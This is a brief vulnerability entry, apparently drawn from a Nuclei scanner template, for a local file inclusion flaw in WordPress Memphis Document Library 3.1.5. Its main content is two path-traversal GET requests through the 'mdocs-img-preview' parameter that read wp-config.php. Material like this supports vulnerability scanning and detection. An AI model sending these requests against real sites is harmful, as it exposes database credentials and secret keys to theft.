# Vulnerability: WordPress Memphis Document Library 3.1.5 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-memphis-documents-library-lfi.yaml`)

## Description
WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
GET {{BaseURL}}/?mdocs-img-preview=../../../wp-config.php
```

